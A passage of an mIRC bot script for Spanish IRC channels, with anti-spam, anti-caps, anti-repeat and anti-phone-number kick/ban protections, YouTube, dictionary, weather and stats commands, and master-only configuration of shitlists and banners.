          else { .timerANTISEXOAvisa- $+ $target -m 1 500 $iif(%AVISA.CANAL- [ $+ [ $target ] ],msg $target,notice $nick) $nick $iif(%MSG.AVISO.ANTISEXO. [ $+ [ $target ] ] != $null,%MSG.AVISO.ANTISEXO. [ $+ [ $target ] ],°El sexo en este canal est· prohibido!) $hget(ANTISEXO,$target $+ \ $+ $nick) $iif($calc($hget(ANTISEXO,$target $+ \ $+ $nick) + 1) > %protnavisos,y ultimo) aviso. }
        }
      }
      if (%ANTITELEFONOS. [ $+ [ $target ] ]) && ($nick !isop $target) && ($iif($hget(l- $+ $target,NOJOIN) != $null,$iif($hget(l- $+ $target,NOJOIN) isnum,$hget(l- $+ $target,NOJOIN),-1),-1) >= $iif($gettok($hget(r- $+ $target,$nick),1,32) isnum,$gettok($hget(r- $+ $target,$nick),1,32),-1)) {
        if ($AntiTelefonos($1-) == si) { mode $chan +bb $nick $address($nick,2) | kick $chan $nick $iif(%MSG.KICK.AntiTelefonos. [ $+ [ $target ] ] != $null,$ifmatch,Los n˙meros telefÛnicos est·n prohibidos en este canal) | halt }
      }
      if (%antispam. [ $+ [ $target ] ]) && ($nick !isop $target) && ($iif($hget(l- $+ $target,NOJOIN) != $null,$iif($hget(l- $+ $target,NOJOIN) isnum,$hget(l- $+ $target,NOJOIN),-1),-1) >= $iif($gettok($hget(r- $+ $target,$nick),1,32) isnum,$gettok($hget(r- $+ $target,$nick),1,32),-1)) {
        if ($antispam.exist(anti,$target,$strip($1-)) == SPAM) { mode $chan +bb $nick $address($nick,2) | kick $chan $nick P˙blicidad prohibida en este canal. | halt }
      }
      if (%antimayus. [ $+ [ $target ] ]) && ($nick !isop $target) && ($iif($hget(l- $+ $target,NOJOIN) != $null,$iif($hget(l- $+ $target,NOJOIN) isnum,$hget(l- $+ $target,NOJOIN),-1),-1) >= $iif($gettok($hget(r- $+ $target,$nick),1,32) isnum,$gettok($hget(r- $+ $target,$nick),1,32),-1)) {
        %antmys.d = $strip($1-) | %antmys.d2 = 1 | while ($nick($target,%antmys.d2)) { set %antmys.d $remove(%antmys.d,$ifmatch) | inc %antmys.d2 }
        if ($antimayus(%antmys.d) > %antimayus. [ $+ [ $target ] ]) {
          hadd antimayus $target $+ \ $+ $nick $calc($hget(antimayus,$target $+ \ $+ $nick) + 1)
          .timerantimayus. $+ $target $+ \ $+ $nick 1 40 hdel antimayus $target $+ \ $+ $nick
          %protnavisos = $iif(%AVISOS.antimayus. [ $+ [ $target ] ] == $null,2,%AVISOS.antimayus. [ $+ [ $target ] ])
          if ($hget(antimayus,$target $+ \ $+ $nick) > %protnavisos) { hdel antimayus $target $+ \ $+ $nick | .timerantimayus. $+ $target $+ \ $+ $nick off | mode $chan +bb $nick $address($nick,2) | kick $chan $nick $iif(%MSG.KICK.ANTIMAYUS. [ $+ [ $target ] ] != $null,%MSG.KICK.ANTIMAYUS. [ $+ [ $target ] ],Desactiva las may˙sculas) | halt }
          else {
            if ($hget(antimayus,$target $+ \ $+ $nick) == %protnavisos) { .timerantimayusAvisa- $+ $target -m 1 500 $iif(%AVISA.CANAL- [ $+ [ $target ] ],msg $target,notice $nick) $nick $iif(%MSG.AVISO.ANTIMAYUS. [ $+ [ $target ] ] != $null,%MSG.AVISO.ANTIMAYUS. [ $+ [ $target ] ],°Desactiva las may˙sculas!) $hget(antimayus,$target $+ \ $+ $nick) y ultimo aviso. }
            else { .timerantimayusAvisa- $+ $target -m 1 500 $iif(%AVISA.CANAL- [ $+ [ $target ] ],msg $target,notice $nick) $nick $iif(%MSG.AVISO.ANTIMAYUS. [ $+ [ $target ] ] != $null,%MSG.AVISO.ANTIMAYUS. [ $+ [ $target ] ],°Desactiva las may˙sculas!) $hget(antimayus,$target $+ \ $+ $nick) aviso. }
          }
        }
      }
      if (%ANTIREPES- [ $+ [ $target ] ]) && ($nick !isop $target) && ($iif($hget(l- $+ $target,NOJOIN) != $null,$iif($hget(l- $+ $target,NOJOIN) isnum,$hget(l- $+ $target,NOJOIN),-1),-1) >= $iif($gettok($hget(r- $+ $target,$nick),1,32) isnum,$gettok($hget(r- $+ $target,$nick),1,32),-1)) {
        if ($remove($strip($1-),$chr(32)) == $gettok($hget(reps,$target $+ \ $+ $nick),2-,32)) { hadd reps $target $+ \ $+ $nick $calc($gettok($hget(reps,$target $+ \ $+ $nick),1,32) + 1) $gettok($hget(reps,$target $+ \ $+ $nick),2-,32) }
        else { .timerepez. $+ $target $+ \ $+ $nick 1 600 hdel reps $target $+ \ $+ $nick | hadd reps $target $+ \ $+ $nick 0 $remove($strip($1-),$chr(32)) }
        if ($gettok($hget(reps,$target $+ \ $+ $nick),1,32) > $iif(%AVISOS.ANTIREPES. [ $+ [ $target ] ] != $null,%AVISOS.ANTIREPES. [ $+ [ $target ] ],4)) { hdel reps $target $+ \ $+ $nick | .timerepez. $+ $target $+ \ $+ $nick off | mode $target +bb $nick $address($nick,2) | kick $target $nick $iif(%MSG.KICK.ANTIREPES. [ $+ [ $target ] ] != $null,%MSG.KICK.ANTIREPES. [ $+ [ $target ] ],Las repeticiones estan prohibidas) | halt }
        elseif ($gettok($hget(reps,$target $+ \ $+ $nick),1,32) >= 1) && ($me isop $target) { $iif(%AVISA.CANAL- [ $+ [ $target ] ],msg $target,notice $nick) $nick $iif(%MSG.AVISO.ANTIREPES. [ $+ [ $target ] ] != $null,%MSG.AVISO.ANTIREPES. [ $+ [ $target ] ],°No repeticiones!) $gettok($hget(reps,$target $+ \ $+ $nick),1,32) $iif($calc($gettok($hget(reps,$target $+ \ $+ $nick),1,32) + 1) > $iif(%AVISOS.ANTIREPES. [ $+ [ $target ] ] != $null,%AVISOS.ANTIREPES. [ $+ [ $target ] ],4),y ultimo) aviso. }
      }
      if ($strip($1) == %PREFIX- [ $+ [ $target ] ] $+ LINEAS) && (!%tms.lineas- [ $+ [ $target ] ]) && (%Stats.status. [ $+ [ $target ] ]) { set -u30 %tms.lineas- [ $+ [ $target ] ] $ctime | stats.lineas $target 1 $iif($strip($2) != $null,$ifmatch,$nick) $target }
      if ($strip($1) == %PREFIX- [ $+ [ $target ] ] $+ WEB) && (!%SWEB- [ $+ [ $target ] ]) { set -u40 %SWEB- [ $+ [ $target ] ] $ctime | msg $target 2Pagina web del canal $iif(%web- [ $+ [ $target ] ],12 $+ %web- [ $+ [ $target ] ] $+ ,12no definida) $iif(%Stats.status. [ $+ [ $target ] ],2EstadÌsticas en 12 $+ %Stats.WEB $+ $lower($network) $+ / $+ $lower($right($target,-1)) $+ .html) | halt }
      if (%YOUTUBE.autolink- [ $+ [ $target ] ]) && (!%tms.youtube- [ $+ [ $target ] ]) && (%UYOUTUBE- [ $+ [ $target ] ]) && ($strip($1) != %PREFIX- [ $+ [ $target ] ] $+ YOUTUBE) {
        if (youtube.com/ isin $strip($1-)) {
          set -u50 %tms.youtube- [ $+ [ $target ] ] $ctime
          %youtube.link = $replace($strip($1-),youtube.com,$chr(32) youtube.com $chr(32))
          %youtube.link = $gettok(%youtube.link,$calc($findtok(%youtube.link,youtube.com,32) + 1),32)
          if ($left(%youtube.link,1) == /) { youtube.exalink $target $nick http://www.youtube.com $+ %youtube.link }
        }
        if (youtu.be/ isin $strip($1-)) {
          set -u50 %tms.youtube- [ $+ [ $target ] ] $ctime
          %youtube.link = $replace($strip($1-),youtu.be,$chr(32) youtu.be $chr(32))
          %youtube.link = $gettok(%youtube.link,$calc($findtok(%youtube.link,youtu.be,32) + 1),32)
          if ($left(%youtube.link,1) == /) { youtube.exalink $target $nick http://www.youtube.com/watch?v= $+ $mid(%youtube.link,2,$len(%youtube.link)) }
        }
      }
      if ($strip($1) == %PREFIX- [ $+ [ $target ] ] $+ YOUTUBE) && ($2) && (!%tms.youtube- [ $+ [ $target ] ]) && (%UYOUTUBE- [ $+ [ $target ] ]) {
        set -u50 %tms.youtube- [ $+ [ $target ] ] $ctime
        if ($left($strip($2),4) == www.) || ($left($strip($2),7) == http://) {
          if (youtube.com/ isin $strip($2)) { youtube.exalink $target $nick $strip($2) }
          if (youtu.be/ isin $strip($2)) { youtube.exalink $target $nick http://www.youtube.com/watch?v= $+ $gettok($remove($strip($2),//),2,47) }
        }
        else { msg $target 1You4Tube2: 12http://www.youtube.com/results?search_query= $+ $replace($strip($2-),+,% $+ 2B,$chr(32),+) $+ &search=Search2 - $strip($2-) }
        halt
      }
      if ($strip($1) == %PREFIX- [ $+ [ $target ] ] $+ DIC) && ($2) && (!%tms.dic- [ $+ [ $target ] ]) && (%UDIC- [ $+ [ $target ] ]) {
        set -u50 %tms.dic- [ $+ [ $target ] ] $ctime 
        sockclose dic. $+ $chr(3) $+ $target $+ $chr(2) $+ $strip($2) | sockopen dic. $+ $chr(3) $+ $target $+ $chr(2) $+ $strip($2) lema.rae.es 80
        halt
      }
      if ($strip($1) == %PREFIX- [ $+ [ $target ] ] $+ TRADUCTOR) && ($2) && (!%tms.traductor- [ $+ [ $target ] ]) && (%UTRADUCTOR- [ $+ [ $target ] ]) { set -u50 %tms.traductor- [ $+ [ $target ] ] $ctime | traductor.on $target $nick $replace($strip($2-),+,% $+ 2B,$chr(32),+) }
      if ($strip($1) == %PREFIX- [ $+ [ $target ] ] $+ GOOGLE) && ($2) && (!%tms.google- [ $+ [ $target ] ]) && (%UGOOGLE- [ $+ [ $target ] ]) { set -u50 %tms.google- [ $+ [ $target ] ] $ctime | google.exalink $target $nick $replace($strip($2-),+,% $+ 2B,$chr(32),+) | halt }
      if ($strip($1) == %PREFIX- [ $+ [ $target ] ] $+ HOROSCOPO) && (!%tms.horos- [ $+ [ $target ] ]) && (%UHOROS- [ $+ [ $target ] ]) { set -u50 %tms.horos- [ $+ [ $target ] ] $ctime | horoscopo $target $2 | halt }
      if ($strip($1) == %PREFIX- [ $+ [ $target ] ] $+ TIEMPO) && (!%tms.tiempo- [ $+ [ $target ] ]) && (%UTIEMPO- [ $+ [ $target ] ]) {
        set -u50 %tms.tiempo- [ $+ [ $target ] ] $ctime
        if (!$strip($2)) { msg $target 2ERROR:2 Sintaxis: %PREFIX- [ $+ [ $target ] ] $+ TIEMPO 12REGION LOCALIDAD 2Ejem:12 %PREFIX- [ $+ [ $target ] ] $+ TIEMPO espaÒa murcia cartagena }
        else { accuw $target $strip($2-) }
      }
    }
  }
  ;Solo obedecemos a los masters:
  if ($mid($target,1,1) != $chr(35)) { %canaldestinoMSG = $gettok($strip($1-),1,32) | %msgdestino = $nick }
  else { %canaldestinoMSG = $target | %msgdestino = $target | tokenize 32 %canaldestinoMSG $1- }
  if ($findtok($hget(masters,%canaldestinoMSG),$nick,32) != $null) || ($findtok($hget(masters,$target),$nick,32) != $null) {
    if (%MGB == s)  {
      if (!%PREFIX- [ $+ [ %canaldestinoMSG ] ]) { set %PREFIX- [ $+ [ %canaldestinoMSG ] ] ! }
      if ($mid($target,1,1) == $chr(35)) {
        if ($left($strip($2),1) != %PREFIX- [ $+ [ %canaldestinoMSG ] ]) {
          if (%YOUTUBE.autolink- [ $+ [ $target ] ]) && ($strip($1) != YOUTUBE) {
            if (youtube.com/ isin $strip($1-)) {
              %youtube.link = $replace($strip($1-),youtube.com,$chr(32) youtube.com $chr(32))
              %youtube.link = $gettok(%youtube.link,$calc($findtok(%youtube.link,youtube.com,32) + 1),32)
              if ($left(%youtube.link,1) == /) { youtube.exalink $target $nick http://www.youtube.com $+ %youtube.link }
            }
            if (youtu.be/ isin $strip($1-)) {
              %youtube.link = $replace($strip($1-),youtu.be,$chr(32) youtu.be $chr(32))
              %youtube.link = $gettok(%youtube.link,$calc($findtok(%youtube.link,youtu.be,32) + 1),32)
              if ($left(%youtube.link,1) == /) { youtube.exalink $target $nick http://www.youtube.com/watch?v= $+ $mid(%youtube.link,2,$len(%youtube.link)) }
            }
          }
          return
        }
        else { tokenize 32 $1 $mid($strip($2),2,$len($2)) $3- }
      }
      if ($strip($2) == CINE.ESTRENOS) { cine.estrenos %msgdestino }
      if ($strip($2) == DOCK) {
        if ($strip($3) == ON) {
          if (%DOCK) { msg %msgdestino 2ERROR:2 Ya est· activado el comando DOCK }
          else { set %dock o | msg %msgdestino 2Comando2 DOCK2 2Activado. | .msg x dock }
          halt
        }
        if ($strip($3) == OFF) {
          if (%dock) { unset %dock | msg %msgdestino 2Comando2 DOCK2 DesActivado. }
          else { msg %msgdestino 2ERROR:2 El comando DOCK no esta activado para poder desactivarlo. }
          halt
        }
        msg %msgdestino 2Error2: Sintaxis,2 %PREFIX- [ $+ [ %canaldestinoMSG ] ] $+ DOCK ON\OFF | halt
      }
      if ($strip($2) == BANS.EXP) {
        if ($strip($3) == ON) && ($strip($4) isnum) {
          if (%BANS.EXP. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est· activado el comando BANS.EXP2 con12 %BANS.EXP. [ $+ [ %canaldestinoMSG ] ] 2minutos. }
          else { set %BANS.EXP. $+ %canaldestinoMSG $strip($4) | msg %msgdestino 2Comando2 BANS.EXP2 2Activado. Los bans mayores a12 $strip($4) 2minutos, seran eliminados automaticamente. | BANS.EXP }
          halt
        }
        if ($strip($3) == OFF) {
          if (%BANS.EXP. [ $+ [ %canaldestinoMSG ] ]) { unset %BANS.EXP. [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Comando2 BANS.EXP2 DesActivado. }
          else { msg %msgdestino 2ERROR:2 El comando BANS.EXP no esta activado para poder desactivarlo. }
          halt
        }
        msg %msgdestino 2Error2: Sintaxis,2 %PREFIX- [ $+ [ %canaldestinoMSG ] ] $+ BANS.EXP ON\OFF <Minutos> | halt
      }
      if ($strip($2) == START.NOSAY) {
        if ($strip($3) != ON) && ($strip($3) != OFF) { msg %msgdestino 2Error2: Especifique el estado,2 START.NOSAY ON\OFF | halt }
        if ($strip($3) == ON) {
          if (%START.NOSAY. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 START.NOSAY2 ya est· activado. }
          else { set %START.NOSAY. $+ %canaldestinoMSG s | msg %msgdestino 2Ok2, Comando START.NOSAY Activado. }
        }
        if ($strip($3) == OFF) {
          if (!%START.NOSAY. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 START.NOSAY2 no esta activado. }
          else { unset %START.NOSAY. [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Ok2, Comando START.NOSAY Desactivado. }
        }
      }
      if ($strip($2) == AVISA.CANAL) {
        if ($strip($3) != ON) && ($strip($3) != OFF) { msg %msgdestino 2Error2: Especifique el estado,2 AVISA.CANAL ON\OFF | halt }
        if ($strip($3) == ON) {
          if (%AVISA.CANAL- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 AVISA.CANAL2 ya est· activado. }
          else { set %AVISA.CANAL- $+ %canaldestinoMSG s | msg %msgdestino 2Ok2, Comando AVISA.CANAL activado, los avisos de las protecciones se mostraran en el canal. }
        }
        if ($strip($3) == OFF) {
          if (!%AVISA.CANAL- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 AVISA.CANAL2 no esta activado. }
          else { unset %AVISA.CANAL- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Ok2, Comando AVISA.CANAL desactivado, los avisos de las protecciones se mostraran por notice al usuario. }
        }
      }
      if ($strip($2) == UTIEMPO) {
        if ($strip($3) != ON) && ($strip($3) != OFF) { msg %msgdestino 2Error2: Especifique el estado,2 UTIEMPO ON\OFF | halt }
        if ($strip($3) == ON) {
          if (%UTIEMPO- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 UTIEMPO2 ya est· activado. }
          else { set %UTIEMPO- $+ %canaldestinoMSG s | msg %msgdestino 2Ok2, Comando UTIEMPO activado. }
        }
        if ($strip($3) == OFF) {
          if (!%UTIEMPO- [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2Error2: El comando2 UTIEMPO2 no esta activado. }
          else { unset %UTIEMPO- [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Ok2, Comando UTIEMPO desactivado. }
        }
      }
      if ($strip($2) == TIEMPO) {
        if (!$strip($3)) { msg %msgdestino 2ERROR:2 Sintaxis: TIEMPO 12REGION LOCALIDAD 2Ejem:12 TIEMPO espaÒa murcia cartagena }
        else { accuw %msgdestino $strip($3-) }
      }
      if ($strip($2) == NICK.NCOM) {
        if ($strip($3) != cm) && ($strip($3) != add) && ($strip($3) != del) && ($strip($3) != list) && ($strip($3) != ON) && ($strip($3) != OFF) { msg %msgdestino 2ERROR:2 Sintaxis: NICK.NCOM ON\OFF\ADD\DEL\LIST\CM }
        else {
          if ($strip($3) == LIST) {
            %NICK.NCOM.list2 = %rHcN $+ NICK.NCOM- $+ %canaldestinoMSG $+ .txt
            if ($lines(%NICK.NCOM.list2) == 0) { msg %msgdestino 2Error2: La lista de 2NICK.NCOM2 esta vacia. }
            else {
              unset %NICK.NCOM.listi %NICK.NCOM.list3
              msg %msgdestino 2La lista de 2NICK.NCOM2 contiene12 $lines(%NICK.NCOM.list2) 2palabras:
              var %linesNICK.NCOM $lines(%NICK.NCOM.list2)
              .fopen NICK.NCOM- $+ %canaldestinoMSG %NICK.NCOM.list2
              while (!$feof) && (!$ferr) {
                var %NICK.NCOM.lread $fread(NICK.NCOM- $+ %canaldestinoMSG)
                var %NICK.NCOM.2read $fread(NICK.NCOM- $+ %canaldestinoMSG)
                var %NICK.NCOM.3read $fread(NICK.NCOM- $+ %canaldestinoMSG)
                var %NICK.NCOM.4read $fread(NICK.NCOM- $+ %canaldestinoMSG)
                var %NICK.NCOM.5read $fread(NICK.NCOM- $+ %canaldestinoMSG)
                var %NICK.NCOM.6read $fread(NICK.NCOM- $+ %canaldestinoMSG)
                inc %NICK.NCOM.listi 6
                set %NICK.NCOM.list4 12 $+ $iif(%NICK.NCOM.lread,%NICK.NCOM.lread $+ 2 $chr(44) $+ 12) $+ $iif(%NICK.NCOM.2read,%NICK.NCOM.2read $+ 2 $chr(44) $+ 12) $+ $iif(%NICK.NCOM.3read,%NICK.NCOM.3read $+ 2 $chr(44) $+ 12) $+ $iif(%NICK.NCOM.4read,%NICK.NCOM.4read $+ 2 $chr(44) $+ 12) $+ $iif(%NICK.NCOM.5read,%NICK.NCOM.5read $+ 2 $chr(44)) $+ 12 $+ %NICK.NCOM.6read $+ 
                if (%NICK.NCOM.listi >= %linesNICK.NCOM) {
                  if ($strip($gettok(%NICK.NCOM.list4,$gettok(%NICK.NCOM.list4,0,32),32)) == $chr(44)) { set %NICK.NCOM.list4 $gettok(%NICK.NCOM.list4,1- $+ $calc($gettok(%NICK.NCOM.list4,0,32) - 1),32) $+ 2. }
                  else { set %NICK.NCOM.list4 %NICK.NCOM.list4 $+ 2. }
                }
                inc %NICK.NCOM.list3 4 | .timerNICK.NCOMlist- $+ %msgdestino $+ %NICK.NCOM.list3 1 %NICK.NCOM.list3 msg %msgdestino %NICK.NCOM.list4
              }
              .fclose NICK.NCOM- $+ %canaldestinoMSG
            }
          }
          if ($strip($3) == CM) {
            if ($strip($4) != ON) && ($strip($4) != OFF) { msg %msgdestino 2ERROR:2 Sintaxis: NICK.NCOM CM ON\OFF | halt }
            if ($strip($4) == ON) {
              if (%NICK.NCOMCM. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est· activado el CM para NICK.NCOM2. }
              else { set %NICK.NCOMCM. $+ %canaldestinoMSG on | msg %msgdestino 2NICK.NCOM CM2 2Activado, no se expulsaran usuarios con CM y CHAT en el nick. }
            }
            if ($strip($4) == OFF) {
              if (%NICK.NCOMCM. [ $+ [ %canaldestinoMSG ] ]) { unset %NICK.NCOMCM. [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2CM para2 NICK.NCOM2 DesActivado. }
              else { msg %msgdestino 2ERROR: NICK.NCOM CM2 no esta activado para poderlo desactivar. }
            }
          }
          if ($strip($3) == ON) {
            if (%NICK.NCOM. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est· activada la protecciÛn NICK.NCOM2. }
            else { set %NICK.NCOM. $+ %canaldestinoMSG on | msg %msgdestino 2ProtecciÛn2 NICK.NCOM2 2Activada. }
          }
          if ($strip($3) == OFF) {
            if (%NICK.NCOM. [ $+ [ %canaldestinoMSG ] ]) { unset %NICK.NCOM. [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2ProtecciÛn2 NICK.NCOM2 DesActivada. }
            else { msg %msgdestino 2ERROR:2 La protecciÛn NICK.NCOM no esta activada para poderla desactivar. }
          }
          if ($strip($3) == ADD) {
            if ($strip($4)) {
              if ($NICK.NCOM.add(%canaldestinoMSG,$strip($4)) == ok) { msg %msgdestino 2NICK.NCOM2: La palabra:12 $strip($4) 2ha sido agregada. | halt }
              else { msg %msgdestino 2Error:2 NICK.NCOM: La palabra:12 $strip($4) 2ya existe. | halt }
            }
            else { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis NICK.NCOM ADD <PALABRA> }
          }
          if ($strip($3) == DEL) {
            if ($strip($4)) {
              if ($NICK.NCOM.del(%canaldestinoMSG,$strip($4)) == ok) { msg %msgdestino 2NICK.NCOM2: La palabra:12 $strip($4) 2ha sido eliminada. }
              else { msg %msgdestino 2Error:2 NICK.NCOM: La palabra:12 $strip($4) 2no existe. }
            }
            else { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis NICK.NCOM DEL <PALABRA> }
          }
        }
      }
      if ($strip($2) == CANAL.NCOM) {
        if ($strip($3) != add) && ($strip($3) != del) && ($strip($3) != list) { msg %msgdestino 2ERROR:2 Sintaxis: CANAL.NCOM ADD\DEL\LIST }
        else {
          if ($strip($3) == add) {
            if (!$strip($4)) || ($mid($strip($4),1,1) != $chr(35)) { msg %msgdestino 2ERROR:2 Sintaxis: CANAL.NCOM ADD <#canal> | return }
            if ($findtok(%CANAL.NCOM. [ $+ [ %canaldestinoMSG ] ],$strip($4),32)) { msg %msgdestino 2ERROR:12 $strip($4) 2ya est· en canales no compatibles de este canal. | return }
            set %CANAL.NCOM. $+ %canaldestinoMSG %CANAL.NCOM. [ $+ [ %canaldestinoMSG ] ] $strip($4) | msg %msgdestino 2CANAL.NCOM12 $strip($4) 2aÒadido a la lista de canales no compatibles.
          }
          if ($strip($3) == del) {
            if (!$strip($4)) || ($mid($strip($4),1,1) != $chr(35)) { msg %msgdestino 2ERROR:2 Sintaxis: CANAL.NCOM DEL <#canal> | return }
            if (!$findtok(%CANAL.NCOM. [ $+ [ %canaldestinoMSG ] ],$strip($4),32)) { msg %msgdestino 2ERROR:12 $strip($4) 2no esta en canales no compatibles de este canal. | return }
            set %CANAL.NCOM. $+ %canaldestinoMSG $deltok(%CANAL.NCOM. [ $+ [ %canaldestinoMSG ] ],$findtok(%CANAL.NCOM. [ $+ [ %canaldestinoMSG ] ],$strip($4),32),32) | msg %msgdestino 2CANAL.NCOM12 $strip($4) 2eliminado de canales no compatibles.
          }
          if ($strip($3) == LIST) {
            msg %msgdestino $iif(%CANAL.NCOM. [ $+ [ %canaldestinoMSG ] ] == $null,2No hay nadie en 2CANALES NO COMPATIBLES,2CANALES NO COMPATIBLES2 Listado:12 $replace(%CANAL.NCOM. [ $+ [ %canaldestinoMSG ] ],$chr(32),$chr(44) $chr(32)))
          }
        }
      }
      if ($strip($2) == auto.banner) {
        if ($strip($3) == off) {
          if (%AUTO.BANNER. [ $+ [ %canaldestinoMSG ] ]) { unset %AUTO.BANNER. [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Comando2 AUTO.BANNER2 DesActivado. }
          else { msg %msgdestino 2ERROR:2 El comando AUTO.BANNER no est· activado para poderlo desactivar. }
        }
        else {
          if ($strip($3) != on) { msg %msgdestino 2ERROR:2 Sintaxis: Auto.Banner <on\off> <segundos> <Mensaje> | halt }
          if ($strip($4) !isnum) || (!$strip($5-)) { msg %msgdestino 2ERROR:2 Sintaxis: Auto.Banner <on\off> <segundos> <Mensaje> | halt }
          if (%AUTO.BANNER. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est· activado el comando AUTO.BANNER2. }
          else { set %AUTO.BANNER. $+ %canaldestinoMSG $strip($4) $5- | msg %msgdestino 2Comando2 AUTO.BANNER 2Activado. | auto.banner.say %canaldestinoMSG $strip($4) $5- }
      } }
      if ($strip($2) == ShitList) {
        if ($strip($3) != add) && ($strip($3) != del) && ($strip($3) != list) { msg %msgdestino 2ERROR:2 Sintaxis: ShitList ADD\DEL\LIST }
        else {
          if ($strip($3) == LIST) {
            %ShitList.list2 = %rHcN $+ ShitList- $+ %canaldestinoMSG $+ .txt
            if ($lines(%ShitList.list2) == 0) { msg %msgdestino 2Error2: La lista de 2ShitList2 esta vacia. }
            else {
              unset %ShitList.listi %ShitList.list3
              msg %msgdestino 2La lista de 2ShitList2 contiene12 $lines(%ShitList.list2) 2mascara(s):
              var %linesShitList $lines(%ShitList.list2)
              .fopen ShitList- $+ %canaldestinoMSG %ShitList.list2
              while (!$feof) && (!$ferr) {
                var %ShitList.lread $gettok($fread(ShitList- $+ %canaldestinoMSG),1,32)
                var %ShitList.2read $gettok($fread(ShitList- $+ %canaldestinoMSG),1,32)
                var %ShitList.3read $gettok($fread(ShitList- $+ %canaldestinoMSG),1,32)
                var %ShitList.4read $gettok($fread(ShitList- $+ %canaldestinoMSG),1,32)
                var %ShitList.5read $gettok($fread(ShitList- $+ %canaldestinoMSG),1,32)
                var %ShitList.6read $gettok($fread(ShitList- $+ %canaldestinoMSG),1,32)
                inc %ShitList.listi 6
                set %ShitList.list4 12 $+ $iif(%ShitList.lread,%ShitList.lread $+ 2 $chr(44) $+ 12) $+ $iif(%ShitList.2read,%ShitList.2read $+ 2 $chr(44) $+ 12) $+ $iif(%ShitList.3read,%ShitList.3read $+ 2 $chr(44) $+ 12) $+ $iif(%ShitList.4read,%ShitList.4read $+ 2 $chr(44) $+ 12) $+ $iif(%ShitList.5read,%ShitList.5read $+ 2 $chr(44)) $+ 12 $+ %ShitList.6read $+ 
                if (%ShitList.listi >= %linesShitList) {
                  if ($strip($gettok(%ShitList.list4,$gettok(%ShitList.list4,0,32),32)) == $chr(44)) { set %ShitList.list4 $gettok(%ShitList.list4,1- $+ $calc($gettok(%ShitList.list4,0,32) - 1),32) $+ 2. }
                  else { set %ShitList.list4 %ShitList.list4 $+ 2. }
                }
                inc %ShitList.list3 4 | .timerShitListlist- $+ %canaldestinoMSG $+ %ShitList.list3 1 %ShitList.list3 msg %msgdestino %ShitList.list4
              }
              .fclose ShitList- $+ %canaldestinoMSG
            }
          }
          if ($strip($3) == ADD) {
            if ($strip($4)) && (*!*@* iswm $strip($4)) {
              if ($ShitList.add(%canaldestinoMSG,$strip($4),$iif(!$strip($5),ShitList Usted no puede permanecer en este canal.,$5-)) == ok) { msg %msgdestino 2ShitList2: NiCk12 $strip($4) 2aÒadido a la lista de ban-kick.
                %shitlist.nicklist = 1 | while ($nick(%canaldestinoMSG,%shitlist.nicklist) != $null) { shitlist.m $ifmatch | inc %shitlist.nicklist }
                halt
              }
              else { msg %msgdestino 2ERROR:12 $strip($4) 2ya est· en la shitlist de este canal. | halt }
            }
            else { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis ShitList ADD nick!identd@ipvirtual <Motivo(opcional)> 2Puede usar comodines, ejemplo: ADD ElNiCK!*@* }
          }
          if ($strip($3) == DEL) {
            if ($strip($4)) {
              if ($ShitList.del(%canaldestinoMSG,$strip($4)) == ok) { msg %msgdestino 2ShitList2: NiCk12 $strip($4) 2eliminado de la lista de ban-kick. }
              else { msg %msgdestino 2ERROR:12 $strip($4) 2no esta en la shitlist de este canal. }
            }
            else { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis ShitList DEL <NiCk> }
          }
        }
      }
      if ($strip($2) == LINEAS) {
        if (%Stats.status. [ $+ [ %canaldestinoMSG ] ]) { stats.lineas %canaldestinoMSG 1 $iif($strip($3) != $null,$ifmatch,$nick) %msgdestino }
        else { msg %msgdestino 2ERROR:2 Las Stats no estan Activadas. }
      }
      if ($strip($2) == TOP5) {
        if (%Stats.status. [ $+ [ %canaldestinoMSG ] ]) { stats.lineas %canaldestinoMSG 2 %msgdestino }
        else { msg %msgdestino 2ERROR:2 Las Stats no estan Activadas. }
      }
      if ($strip($2) == STATS) {
        if ($strip($3) == Reset) {
          if ($gettok(%Stats.act,1,32) == %canaldestinoMSG) { msg %msgdestino 2ERROR:2 Para hacer el RESET espera a que termine la actualizaciÛn. }
          else { stats.reset %canaldestinoMSG | msg %msgdestino 2Las Stats2 han sido reseteadas. }
          halt
        }
        if ($strip($3) == ACTUALIZA) || ($strip($3) == FUERZA) {
          if (%Stats.status. [ $+ [ %canaldestinoMSG ] ]) {
            if (%Stats.act) && ($strip($3) != FUERZA) { msg %msgdestino 2ERROR:2 Ya hay una actualizaciÛn de Stats en curso, espere.. }
            else { if ($strip($3) == FUERZA) { unset %Stats.act | msg %msgdestino Forzando estadÌsticas .. } | statsmirc %canaldestinoMSG $nick }
          }
          else { msg %msgdestino 2ERROR:2 Las Stats no estan Activadas. }
          halt
        }
        if ($strip($3) == ON) {
          if (%Stats.status. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est·n activadas las Stats. }
          else {
            set %Stats.status. $+ %canaldestinoMSG o | msg %msgdestino 2Stats2 Activadas $iif(%Stats.status.auto. [ $+ [ %canaldestinoMSG ] ],(Se actualizaran cada12 %Stats.status.auto. [ $+ [ %canaldestinoMSG ] ] 2minutos))
